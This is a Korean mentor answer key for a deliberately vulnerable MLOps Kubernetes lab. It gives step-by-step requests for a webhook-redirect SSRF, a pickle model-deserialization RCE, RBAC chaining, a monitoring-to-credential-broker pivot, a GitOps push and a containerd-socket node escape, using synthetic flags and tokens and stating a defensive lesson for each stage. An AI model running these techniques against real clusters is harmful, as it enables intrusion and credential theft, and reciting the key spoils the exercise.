# vuln-mlops Stage 1~5 단계별 Write-up

> 멘토·운영자용 답안지. 실습 전에 참가자에게 공개하지 않는다.
>
> 이 문서의 Flag와 Git token은 모두 랩 전용 placeholder/synthetic 값이다. 실제 AWS
> credential, ServiceAccount token, 임의 파일 내용은 proof 채널로 노출하지 않는다.
>
> 참가자용 EKS 구성은 허용된 팀원 공인 IP `/32`에서만 접근할 수 있는 ModelGate 전용
> 단일-EIP HTTP NLB를 사용한다. 이 endpoint에는 synthetic lab 데이터만 전송한다.
> 내부 `ClusterIP` Service와 운영자 `port-forward`는 진단용으로만 유지한다.

---

## 전체 공격 흐름

```text
외부 HTTP 사용자
  -> Stage 1A: webhook redirect SSRF
  -> Stage 1B: statsmodels Pickle 역직렬화 marker RCE
  -> modelgate ServiceAccount 실행 문맥
  -> Stage 2: 고정 Job 생성 -> monitoring-runner ServiceAccount
  -> Stage 3: Grafana datasource -> Prometheus topology -> credential broker
  -> 제한된 synthetic Git credential
  -> Stage 4: 허용 branch/path Git push -> Argo CD reconciliation
  -> Stage 5 runtime-builder
  -> containerd socket -> 전용 escape worker의 synthetic node proof
```

관통 원리는 세 가지다.

1. 다음 Stage의 입력 identity는 반드시 이전 Stage에서 얻는다.
2. “리소스를 볼 수 있음”과 “직접 읽거나 수정할 수 있음”은 다르다.
3. proof는 성공 여부만 증명하며 범용 credential이나 임의 파일 읽기 채널이 아니다.

---

## 사전 준비 — 참가자 EKS 진입점

운영자가 제공한 고정 EIP를 사용한다. 참가자는 Kubernetes나 AWS credential을 받지 않는다.

```bash
export MODELGATE_URL=http://203.0.113.10
```

상태를 확인한다.

```bash
curl -fsS "$MODELGATE_URL/healthz"
# {"status":"ok","version":"0.1.0"}

curl -fsS "$MODELGATE_URL/readyz"
# {"status":"ready"}
```

`203.0.113.10`은 문서용 예시다. 실제 실습에서는 Terraform 출력
`modelgate_public_eip` 값을 사용한다. 운영자 진단이 필요할 때만 내부 Service를 로컬에
연결한다.

```bash
kubectl port-forward -n modelgate-lab service/modelgate 18080:80
```

Stage 1 marker PoC를 로컬에서 실행할 때는 프로젝트가 검증한 Python 3.11 환경을 사용한다.
참가자용 최종 배포에서는 digest-pinned PoC runner로 대체하는 것이 목표다.

---

## Stage 1A — Webhook redirect SSRF

### 목표

외부에서 접근 가능한 ModelGate API를 통해 외부에 노출되지 않은
`lab-canary.stage-01-canary.svc.cluster.local:9000`에 도달한다.

### 내부 주소 발견

첫 화면은 API 기반 서비스라는 점과 공개 API schema 링크만 제공한다. 참가자는 브라우저의
`API documentation` 링크 또는 다음 표준 FastAPI 경로에서 공격 표면을 조사한다.

```bash
curl -fsS "$MODELGATE_URL/openapi.json" |
  python -m json.tool
```

명세에서 `GET /api/system/info`를 발견한 뒤 조회한다.

```bash
curl -fsS "$MODELGATE_URL/api/system/info" |
  python -m json.tool
```

```json
{
  "service": "modelgate",
  "environment": "kubernetes-lab",
  "legacy_webhook_probe": {
    "service": "lab-canary",
    "namespace": "stage-01-canary",
    "port": 9000,
    "path": "/canary"
  }
}
```

Kubernetes의 namespace 간 Service DNS 형식
`<service>.<namespace>.svc.cluster.local`을 적용하면 다음 내부 목적지를 얻는다.

```text
http://lab-canary.stage-01-canary.svc.cluster.local:9000/canary
```

system-info는 이 좌표만 제공하며 완성 URL, ClusterIP, AWS metadata 또는 credential은
노출하지 않는다.

### 핵심

Webhook URL 검증은 최초 URL을 기준으로 이루어지지만, 실제 test 요청은 HTTP redirect를
따른다. 따라서 최초 URL은 공개 HTTPS 주소이고, 그 응답의 `Location`만 cluster-local
canary를 가리키게 만든다.

중요한 점은 canary 응답이 AWS metadata나 Kubernetes Secret이 아니라 고정 문자열
`MODELGATE_INTERNAL_SSRF_PROOF`만 반환한다는 것이다.

### 실제 요청

첫 홉 URL을 만든다.

```text
https://httpbin.org/redirect-to
  ?url=http://lab-canary.stage-01-canary.svc.cluster.local:9000/canary
  &status_code=302
```

Webhook을 등록한다.

```http
POST /api/webhooks HTTP/1.1
Host: <MODELGATE_FIXED_EIP>
Content-Type: application/json

{
  "name": "ssrf-canary-proof",
  "url": "https://httpbin.org/redirect-to?url=http%3A%2F%2Flab-canary.stage-01-canary.svc.cluster.local%3A9000%2Fcanary&status_code=302",
  "events": [
    {"entity": "REGISTERED_MODEL", "action": "CREATED"}
  ],
  "description": "Synthetic internal canary SSRF verification"
}
```

응답에서 `webhook_id`를 얻은 뒤 test endpoint를 호출한다.

```http
POST /api/webhooks/<webhook_id>/test HTTP/1.1
Host: <MODELGATE_FIXED_EIP>
Content-Type: application/json

{"event":{"entity":"REGISTERED_MODEL","action":"CREATED"}}
```

프로젝트 PoC로 동일 요청을 생성할 수 있다.

```bash
POC_MODELGATE_URL="$MODELGATE_URL" \
POC_CANARY_TARGET=eks \
python poc/ssrf_canary.py
```

### 중요한 응답

```json
{
  "proof": "ssrf",
  "success": true,
  "internal_target": "http://lab-canary.stage-01-canary.svc.cluster.local:9000/canary",
  "webhook_id": "<uuid>",
  "canary": "MODELGATE_INTERNAL_SSRF_PROOF"
}
```

canary access log에는 ModelGate Pod IP에서 발생한 다음 요청이 남는다.

```text
GET /canary HTTP/1.1 200 OK
```

### Shortcut이 아닌 이유

- canary Service는 `ClusterIP`이며 Ingress, LoadBalancer, NodePort가 없다.
- canary ingress는 ModelGate Pod label에서 오는 TCP 9000만 허용한다.
- 일반 Pod가 canary FQDN 또는 ClusterIP에 직접 접근하면 timeout으로 실패한다.
- 응답에는 실제 credential이나 다음 Stage Flag가 없다.

### 배운 점

SSRF 방어는 최초 URL만 검사해서는 안 된다. redirect마다 목적지를 다시 검증하고 DNS
rebinding과 private/link-local 대역도 함께 고려해야 한다.

---

## Stage 1B — statsmodels Pickle 역직렬화 RCE

### 목표

외부 ModelGate API만 사용해 model bundle을 등록하고, validator의 자동 모델 검증 과정에서
안전한 marker 파일을 생성한다.

### 핵심

MLflow `statsmodels` 모델의 `model.statsmodels`는 Pickle 형식이다. validator가 등록된 모델을
`mlflow.pyfunc.load_model()`로 불러올 때 Pickle 역직렬화가 발생한다. PoC의 `__reduce__`는
reverse shell이나 credential 접근 대신 UUID 이름의 고정 marker 파일 하나만 만든다.

### 실제 요청

조작된 model bundle을 업로드한다.

```http
POST /api/artifacts HTTP/1.1
Host: <MODELGATE_FIXED_EIP>
Content-Type: application/zip

<rce-proof-model.zip binary>
```

중요한 응답은 업로드 ID와 MLflow artifact URI다.

```json
{
  "upload_id": "<hex-id>",
  "artifact_uri": "models:/m-<model-id>"
}
```

반환된 artifact를 모델로 등록한다.

```http
POST /api/models HTTP/1.1
Host: <MODELGATE_FIXED_EIP>
Content-Type: application/json

{
  "name": "safe-rce-proof-<timestamp>",
  "artifact_uri": "models:/m-<model-id>",
  "description": "Synthetic marker-only external RCE verification"
}
```

응답의 validation job ID를 polling한다.

```http
GET /api/jobs/<validation_job_id> HTTP/1.1
Host: <MODELGATE_FIXED_EIP>
```

성공 후 임의 파일 내용이 아니라 UUID proof 존재 여부만 확인한다.

```http
GET /api/proofs/rce/<proof_id> HTTP/1.1
Host: <MODELGATE_FIXED_EIP>
```

전체 과정을 제공된 PoC로 실행할 수 있다.

```bash
POC_MODELGATE_URL="$MODELGATE_URL" \
python poc/rce_marker.py --timeout 120
```

### 중요한 응답

```json
{
  "proof": "rce",
  "success": true,
  "proof_id": "<uuid>",
  "artifact_uri": "models:/m-<model-id>",
  "validation_job": "<uuid>",
  "validation_status": "succeeded",
  "evidence": "validator marker observed",
  "foothold_session": "<same-proof-uuid>",
  "next": "/api/lab/footholds/<proof-uuid>/self-rules"
}
```

존재하지 않는 UUID를 조회하면 내용 유출 없이 실패한다.

```http
HTTP/1.1 404 Not Found

{"detail":"RCE proof has not been observed"}
```

### Output identity

- `uid=10001`의 validator process execution
- `system:serviceaccount:modelgate-lab:modelgate` ServiceAccount 권한으로 동작하는
  proof-bound foothold relay
- relay는 SelfSubjectRulesReview와 Stage 2의 고정 Job 생성·상태·로그만 제공한다.

### Shortcut이 아닌 이유

- validator는 non-root, capability drop, read-only root filesystem을 유지한다.
- privileged, hostPath, host namespace, runtime socket, AWS identity가 없다.
- proof API는 marker 내용이나 임의 경로를 입력받지 않는다.
- foothold relay는 Kubernetes token, 임의 API path, manifest, namespace, Pod 이름을
  참가자에게 노출하지 않는다.
- MLflow Service는 외부에 직접 노출되지 않는다.

### 배운 점

모델 파일도 실행 가능한 공급망 입력이다. 신뢰하지 않는 Pickle 기반 모델을 자동 로드하는
행위는 코드 실행과 동일하게 취급해야 한다.

---

## Stage 2 — ServiceAccount에서 RBAC identity chaining

### 목표

`modelgate` ServiceAccount가 직접 읽을 수 없는 `stage-02-flag` Secret을, 생성 권한이 있는
고정 Job과 `monitoring-runner` ServiceAccount를 통해 읽는다.

### 핵심

`modelgate`에는 Secret 읽기 권한이 없지만 `stage-02-rbac` namespace에서 제한된 Job을
생성할 수 있다. Admission policy가 허용하는 Job은 이름, image, ServiceAccount, command,
security context가 모두 고정되어 있다. 그 Job의 `monitoring-runner`만 이름이 고정된 Secret을
`get`할 수 있다.

즉, 취약점은 “Secret 권한” 하나가 아니라 다음 권한 조합이다.

```text
modelgate: jobs.create
  + Job.spec.serviceAccountName=monitoring-runner
  + monitoring-runner: secret/stage-02-flag.get
```

### 실제 요청

Stage 1 응답의 `foothold_session`을 사용해 effective permission을 확인한다.

```bash
FOOTHOLD="${MODELGATE_URL}/api/lab/footholds/<proof-uuid>"
curl -fsS "${FOOTHOLD}/self-rules" | python -m json.tool
```

응답의 `resource_rules`에서 `stage-02-rbac`의 `jobs.create`를 찾는다. 이어서 caller가
manifest를 보낼 수 없는 고정 endpoint로 reviewed Job을 생성하고 상태를 polling한다.

```bash
curl -fsS -X POST "${FOOTHOLD}/stage-02/job" | python -m json.tool

curl -fsS "${FOOTHOLD}/stage-02/job" | python -m json.tool
# succeeded가 1이 될 때까지 polling
```

고정 Job의 synthetic 로그를 읽고 Kubernetes Secret의 base64 값을 decode한다.
완료된 Job은 참가자 세션의 Stage 3 선행 증거로 사용되므로 자동 TTL 삭제하지 않고 lab
reset에서 명시적으로 제거한다.

```bash
curl -fsS "${FOOTHOLD}/stage-02/log" | python -m json.tool
# encoded_proof: RkxBR3tzdGFnZV8yX3JiYWNfY2hhaW5pbmdfcGxhY2Vob2xkZXJ9
```

### 중요한 응답

```bash
printf '%s' \
  'RkxBR3tzdGFnZV8yX3JiYWNfY2hhaW5pbmdfcGxhY2Vob2xkZXJ9' |
  base64 --decode

# FLAG{stage_2_rbac_chaining_placeholder}
```

Audit log의 핵심 행위는 다음 두 개다.

```text
system:serviceaccount:modelgate-lab:modelgate
  create jobs/stage-02-secret-reader -> 201

system:serviceaccount:stage-02-rbac:monitoring-runner
  get secrets/stage-02-flag -> 200
```

### 주요 shortcut denial

- `modelgate`의 Secret 직접 `get`: 거부
- 다른 Job 이름 또는 다른 ServiceAccount: admission 거부
- unpinned image, privileged, hostPath, Secret volume, env override: admission 거부
- RoleBinding, ServiceAccount token, Pod exec, node 접근: RBAC 거부
- 다른 namespace의 workload 생성: 거부

### 배운 점

RBAC는 개별 verb만 보지 말고 “workload 생성 권한 × 사용할 수 있는 ServiceAccount” 조합으로
검토해야 한다.

---

## Stage 3 — Monitoring trust chain

### 목표

`monitoring-runner`가 Grafana datasource를 통해 Prometheus의 topology metric을 발견하고,
그 metric에 기록된 제한된 reference로 credential broker에서 synthetic Git credential을
교환한다.

### 핵심

Prometheus 자체에는 Kubernetes discovery 권한이 있지만 참가자의 `monitoring-runner`는
Prometheus에 직접 접근할 수 없다. 허용 경로는 Grafana datasource proxy다.

Metric에는 token 자체가 아니라 broker endpoint와 고정 reference만 들어 있다. 참가자는
reference를 알아낸 후 broker에 요청해 Stage 3 Flag와 제한된 Git credential을 얻는다.

### 실제 요청

Stage 2 log 응답의 `next`를 따라 `monitoring-runner` identity의 제한된 세션에서
Grafana datasource를 열거한다.

```bash
curl -fsS "${FOOTHOLD}/stage-03/datasources" | python -m json.tool
```

응답에서 `stage3-prometheus` UID를 확인한 뒤, 고정 Grafana datasource proxy query를
실행한다. 참가자는 query 문자열이나 내부 URL을 지정하지 않는다.

```bash
curl -fsS "${FOOTHOLD}/stage-03/query" | python -m json.tool
```

### 중요한 topology 응답

```json
{
  "application": "runtime-builder",
  "branch": "stage4-lab",
  "broker": "http://credential-broker.stage-03-monitoring.svc:8080",
  "credential_ref": "stage3-lab-repo-writer",
  "destination": "stage-04-gitops",
  "path": "runtime-builder/",
  "repository": "lab-git.internal/vuln-mlops-gitops",
  "next": "/api/lab/footholds/<proof-uuid>/stage-03/exchange/stage3-lab-repo-writer"
}
```

발견한 reference로 broker에 요청한다.

```bash
curl -fsS \
  "${FOOTHOLD}/stage-03/exchange/stage3-lab-repo-writer" |
  python -m json.tool
```

### 중요한 credential 응답

```json
{
  "flag": "FLAG{stage_3_monitoring_trust_placeholder}",
  "username": "stage3-lab-writer",
  "token": "SYNTHETIC_STAGE3_GIT_TOKEN",
  "repository": "lab-git.internal/vuln-mlops-gitops",
  "branch": "stage4-lab",
  "path": "runtime-builder/",
  "application": "runtime-builder",
  "destination": "stage-04-gitops",
  "git_gateway": "/api/lab/footholds/<proof-uuid>/stage-04/git/vuln-mlops-gitops.git",
  "application_status": "/api/lab/footholds/<proof-uuid>/stage-04/application"
}
```

### 주요 shortcut denial

잘못된 reference는 존재하지 않는 credential로 처리된다.

```bash
curl /exchange/arbitrary-reference
# HTTP 404
```

ModelGate는 `monitoring-session` Service만 연결할 수 있으며 Grafana, Prometheus,
credential broker에는 직접 연결할 수 없다. 세션 relay도 Prometheus 직접 경로를 제공하지
않고 datasource 목록, 고정 query, 정확한 exchange reference 이외 경로는 404로 거부한다.

또한 `monitoring-runner`에는 Secret list, workload 생성, pods/exec, node 또는 node/proxy
권한이 없고 relay에는 ServiceAccount token도 mount되지 않는다. Prometheus/Grafana/broker
Service는 모두 `ClusterIP`이며 Ingress가 없다.

### 배운 점

관측 시스템의 label, annotation, datasource는 운영 topology와 다음 신뢰 경계를 누설할 수
있다. Secret을 직접 노출하지 않아도 reference와 과도한 broker trust가 결합되면 credential
획득으로 이어진다.

---

## Stage 4 — 제한된 Git credential에서 Argo CD reconciliation

### 목표

Stage 3에서 얻은 Git credential로 허용된 `stage4-lab` branch의
`runtime-builder/deployment.yaml`만 변경하고, Argo CD가 기존 `runtime-builder`를
reconcile하게 한다.

### 핵심

credential은 Gitea 계정 전체 쓰기 권한처럼 보이지만 server-side pre-receive hook이 다음
범위만 허용한다.

```text
repository: vuln-mlops-gitops
branch:     stage4-lab
path:       runtime-builder/
```

Argo CD AppProject와 controller RBAC도 `runtime-builder` Deployment의 update/patch로
제한된다. 현재 통합 EKS 경로에서는 workload가 `stage-05-runtime` namespace에 있으며,
Stage 4 성공 증거와 Stage 5 socket-ready desired state를 한 manifest에 담는다.

### 실제 요청

Stage 3 응답의 `git_gateway`는 처음부터 사용한 ModelGate EIP 아래의 상대 경로다.
참가자는 내부 Gitea 주소나 Kubernetes 접근 권한 없이 이 고정 gateway로 clone한다.

```bash
MODELGATE=http://<modelgate-eip>
PROOF_ID=<stage-1-rce-proof-uuid>
GIT_USER=stage3-lab-writer
GIT_TOKEN=SYNTHETIC_STAGE3_GIT_TOKEN
GIT_GATEWAY="/api/lab/footholds/${PROOF_ID}/stage-04/git/vuln-mlops-gitops.git"

git clone \
  --branch stage4-lab \
  "http://${GIT_USER}:${GIT_TOKEN}@<modelgate-eip>${GIT_GATEWAY}"
```

`runtime-builder/deployment.yaml`을 다음 reviewed manifest로 교체한다.

```bash
cp lab/stages/stage-05-runtime/repository/runtime-builder/deployment.yaml \
  <clone-dir>/runtime-builder/deployment.yaml

git -C <clone-dir> add runtime-builder/deployment.yaml
git -C <clone-dir> commit -m 'exercise Stage 4 and Stage 5 path'
git -C <clone-dir> push origin stage4-lab
```

Git push의 중요한 응답은 branch update다.

```text
<old-sha>..<new-sha>  HEAD -> stage4-lab
```

Argo Application의 revision과 상태도 같은 proof 세션으로 확인한다.

```bash
curl -fsS \
  "${MODELGATE}/api/lab/footholds/${PROOF_ID}/stage-04/application" |
  python -m json.tool
```

### 중요한 응답

```json
{
  "name": "runtime-builder",
  "namespace": "stage-05-runtime",
  "sync": "Synced",
  "health": "Healthy",
  "revision": "<new-git-commit-sha>",
  "stage4_proof": "FLAG{stage_4_gitops_placeholder}",
  "stage5_mode": "runtime-socket"
}
```

`revision`은 push 결과의 새 SHA와 같아야 하며 `stage4_proof`와 `stage5_mode`가 다음
runtime 경계가 준비됐음을 보여준다.

Audit log에는 다음 경계가 보여야 한다.

```text
system:serviceaccount:stage-04-gitops:argocd-application-controller
  patch deployments/runtime-builder -> 200
```

### 주요 shortcut denial

- `main` 등 다른 branch push: pre-receive hook 거부
- repository root의 `forbidden.txt` 등 다른 path push: 거부
- 다른 Deployment update: RBAC `Forbidden`
- Deployment 생성/삭제, Secret·ServiceAccount·Role·RoleBinding 생성: 거부
- privileged, hostPath 등 허용 shape 밖의 변경: admission 거부
- 다른 repository 또는 Gitea UI/API 경로: ModelGate route 404
- Basic credential 누락, 임의 Git service, 8 MiB 초과 request: gateway 거부

### 배운 점

Git credential의 위험도는 repository 접근 여부만으로 결정되지 않는다. 허용 branch/path,
GitOps destination, AppProject 범위, controller RBAC와 admission 정책을 하나의 연결된 권한으로
검토해야 한다.

---

## Stage 5 — containerd socket에서 전용 escape worker

### 목표

Argo CD가 제어한 `runtime-builder`에서 containerd CRI socket을 발견하고, 같은 escape
worker의 고정 synthetic node proof를 제한된 CRI 작업으로 확인한다.

### 핵심

`runtime-builder`만 다음 socket을 mount한다.

```text
host:      /run/containerd/containerd.sock
container: /run/stage5/containerd.sock
```

Pod 자체는 `privileged: false`, capability drop, ServiceAccount token 비활성 상태지만 runtime
socket 제어는 사실상 해당 노드의 높은 권한이다. 그래서 workload는 taint와 label이 고정된
전용 escape node에만 배치된다.

### 실제 요청

Stage 4 application 응답의 `runtime_relay` 값을 확인한다.

```json
{
  "runtime_relay": "/api/lab/footholds/<proof-uuid>/stage-05/runtime/proof"
}
```

처음부터 사용한 ModelGate endpoint에 body 없는 POST를 보낸다.

```bash
curl -fsS -X POST \
  "${MODELGATE}/api/lab/footholds/${PROOF_ID}/stage-05/runtime/proof" |
  python -m json.tool
```

내부 relay는 참가자 입력 없이 다음 고정 container config만 생성한다.

```text
image: 현재 digest-pinned runtime-client image
command: cp /proof/stage-05-proof /out/stage5-proof
mount 1: /var/lib/vuln-mlops -> /proof (read-only)
mount 2: 현재 Pod의 emptyDir -> /out
privileged: false
```

### 중요한 응답

```json
{
  "proof": "runtime",
  "success": true,
  "evidence": "synthetic escape-node proof observed",
  "flag": "FLAG{stage_5_node_placeholder}"
}
```

응답 전 relay가 임시 CRI container와 Pod 내부 proof 파일을 제거한다. 참가자에게
Kubernetes credential, `kubectl exec`, sandbox ID 또는 임의 `crictl` 인자는 제공되지 않는다.
baseline의 relay는 HTTP 409를 반환하며 Stage 4 desired state가 proof annotation과 mode를
함께 reconcile해야 admission이 `RELAY_ENABLED=true` 전환을 허용한다.

### 주요 shortcut denial

- containerd socket이 mount된 active Pod는 `stage-05-runtime/runtime-builder` 하나뿐이다.
- runtime-builder를 general node로 옮기는 patch: admission 거부
- 다른 hostPath로 변경: admission 거부
- privileged, hostNetwork, ServiceAccount token 활성화: 거부
- Argo controller의 새 Deployment/Pod/Job/Secret/RBAC 생성: RBAC 거부
- escape node에는 다른 Stage의 일반 workload와 실제 credential을 배치하지 않는다.
- request body, command, image, path, Pod 또는 sandbox 지정: API/relay 거부
- Stage 4가 `Synced/Healthy`가 아니거나 proof/mode가 없으면 relay 호출 전 HTTP 409
- runtime relay는 ClusterIP이며 ModelGate Pod 이외 ingress를 허용하지 않는다.

### 배운 점

non-privileged container라도 runtime socket을 mount하면 node-level control로 이어질 수 있다.
Pod security context뿐 아니라 hostPath, node placement, node IAM, workload co-location을 함께
검토해야 한다.

---

## 자동 전체 검증

현재 구현은 reset 후 Stage 1~5 intended path와 대표 shortcut denial을 한 번에 실행한다.

```bash
export AWS_PROFILE=<explicit-non-root-profile>

POC_PYTHON=/tmp/vuln-mlops-poc-venv/bin/python \
  bash deploy/eks-lab/orchestrate.sh accept
```

성공 시 마지막 출력은 다음과 같다.

```text
PASS: Stage 1-5 intended path and representative shortcut denials completed.
```

이 명령은 다음 cleanup도 수행한다.

- Stage 2 고정 Job 삭제
- Stage 3 임시 client Pod 삭제
- Stage 4/5 Git desired state를 reviewed baseline으로 normal forward commit
- Argo CD가 baseline revision에서 `Synced/Healthy`인지 확인
- Stage 5 proof가 있던 Pod를 baseline rollout으로 교체

---

## 단계별 핵심 요청·응답 요약

| Stage | 핵심 요청 | 중요한 응답/증거 |
| --- | --- | --- |
| 1A | OpenAPI → `GET /api/system/info` → webhook create/test | canary 좌표와 `MODELGATE_INTERNAL_SSRF_PROOF` |
| 1B | artifact upload → model register → job polling → proof GET | `validation_status=succeeded`, `validator marker observed` |
| 2 | `modelgate`로 고정 Job 생성, Job log 조회 | base64 decode된 `FLAG{stage_2_rbac_chaining_placeholder}` |
| 3 | Grafana datasource proxy query, broker exchange | repository/branch/path reference와 synthetic Git token |
| 4 | 허용 branch/path Git push | Argo `Synced/Healthy`, Git SHA, Stage 4 proof annotation |
| 5 | containerd CRI `pods/create/start` | escape worker의 `FLAG{stage_5_node_placeholder}` |

---

## 운영자 주의사항

- 이 랩은 공유 또는 운영 cluster에 배포하지 않는다.
- Stage 5 escape node에는 다른 팀 workload를 함께 배치하지 않는다.
- synthetic token과 placeholder Flag를 실제 credential로 교체하지 않는다.
- 현재 Stage 1 redirect first hop은 개인 smoke에서 `httpbin.org`를 사용한다. 팀 실습 전에는
  팀이 통제하는 HTTPS redirector로 교체한다.
- AWS account ID, operator role, access key, subnet/SG ID는 write-up이나 manifest에 넣지 않는다.
- 실습 종료 후 `reset`으로 proof를 지우고, 비용이 발생하는 EKS/NAT/EC2/CloudWatch 자원은
  별도 teardown 절차에 따라 제거한다.
